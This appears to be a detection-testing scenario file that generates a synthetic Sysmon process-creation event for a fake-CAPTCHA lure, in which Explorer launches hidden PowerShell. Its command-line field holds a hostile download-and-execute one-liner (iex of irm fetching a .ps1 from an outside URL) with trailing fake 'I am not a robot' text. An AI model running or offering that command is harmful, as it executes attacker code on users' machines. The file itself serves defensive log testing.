type: scenario
description: |
  Windows Explorer starts PowerShell with a hidden-window command that
  downloads and runs a script and ends in fake CAPTCHA text. Sysmon EID 1
  (Process Create) records explorer.exe starting powershell.exe at High
  integrity under a user account, for example Administrator, with -NoP, a
  hidden window style and a one-line command that fetches a script from a
  URL, for example https://aatox.com/verify/45.ps1, with irm (an alias of
  Invoke-RestMethod) and passes it to iex (an alias of Invoke-Expression).
  A trailing PowerShell comment that starts with a check-mark character
  carries text posing as a CAPTCHA check, for example "I am not a robot |
  Captcha Verification Hash: 7680". The event records the launch and its
  command line, not whether the download or the script succeeded.
tags: [eid1, fake-captcha]
mitre:
  tactics: [execution]
  techniques: [T1059.001, T1204.001]

state:
  host_short:          gen.hostname(class=windows-workstation)
  host_short_lower:    fn.lower(ref.host_short)
  host_short_upper:    fn.upper(ref.host_short)
  computer:            ref.host_short_lower
  user_name:           Administrator
  user:                "${ref.host_short_upper}\\${ref.user_name}"
  sysmon_pid:          gen.int(min=1000, max=4000)
  sysmon_tid:          gen.int(min=1000, max=9999)
  event_record_id:     gen.int(min=5000, max=999999)
  logon_guid_raw:      gen.uuid()
  logon_guid:          "{${ref.logon_guid_raw}}"
  logon_id_hex:        gen.hex(len=5, case=lower)
  logon_id:            "0x${ref.logon_id_hex}"
  terminal_session_id: 2
  process_guid_raw:    gen.uuid()
  process_guid:        "{${ref.process_guid_raw}}"
  process_id:          gen.int(min=5000, max=9999)
  parent_guid_raw:     gen.uuid()
  parent_process_guid: "{${ref.parent_guid_raw}}"
  parent_process_id:   gen.int(min=1000, max=4999)
  script_url:          https://aatox.com/verify/45.ps1
  verification_hash:   "7680"
  command_line:        "\"C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -NoP -WindowStyle Hidden -Command \"iex (irm '${ref.script_url}')\" # ✅ ''I am not a robot | Captcha Verification Hash: ${ref.verification_hash}''"

steps:
  - emit:
      event_type: windows.wineventlog@v1
      fields:
        System:
          Provider:
            "@Name": Microsoft-Windows-Sysmon
            "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
          EventID: 1
          Version: 5
          Level: 4
          Task: 1
          Opcode: 0
          Keywords: "0x8000000000000000"
          TimeCreated:
            "@SystemTime": gen.timestamp(format=wineventlog)
          EventRecordID: ref.event_record_id
          Correlation: {}
          Execution:
            "@ProcessID": ref.sysmon_pid
            "@ThreadID": ref.sysmon_tid
          Channel: Microsoft-Windows-Sysmon/Operational
          Computer: ref.computer
          Security:
            "@UserID": S-1-5-18
        EventData:
          Data:
            - "@Name": RuleName
              "#text": "-"
            - "@Name": UtcTime
              "#text": gen.timestamp(format=sysmon)
            - "@Name": ProcessGuid
              "#text": ref.process_guid
            - "@Name": ProcessId
              "#text": ref.process_id
            - "@Name": Image
              "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            - "@Name": FileVersion
              "#text": "10.0.17763.1 (WinBuild.160101.0800)"
            - "@Name": Description
              "#text": Windows PowerShell
            - "@Name": Product
              "#text": "Microsoft® Windows® Operating System"
            - "@Name": Company
              "#text": Microsoft Corporation
            - "@Name": OriginalFileName
              "#text": PowerShell.EXE
            - "@Name": CommandLine
              "#text": ref.command_line
            - "@Name": CurrentDirectory
              "#text": "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\"
            - "@Name": User
              "#text": ref.user
            - "@Name": LogonGuid
              "#text": ref.logon_guid
            - "@Name": LogonId
              "#text": ref.logon_id
            - "@Name": TerminalSessionId
              "#text": ref.terminal_session_id
            - "@Name": IntegrityLevel
              "#text": High
            - "@Name": Hashes
              "#text": "MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F"
            - "@Name": ParentProcessGuid
              "#text": ref.parent_process_guid
            - "@Name": ParentProcessId
              "#text": ref.parent_process_id
            - "@Name": ParentImage
              "#text": "C:\\Windows\\explorer.exe"
            - "@Name": ParentCommandLine
              "#text": "C:\\Windows\\Explorer.EXE"
            - "@Name": ParentUser
              "#text": ref.user
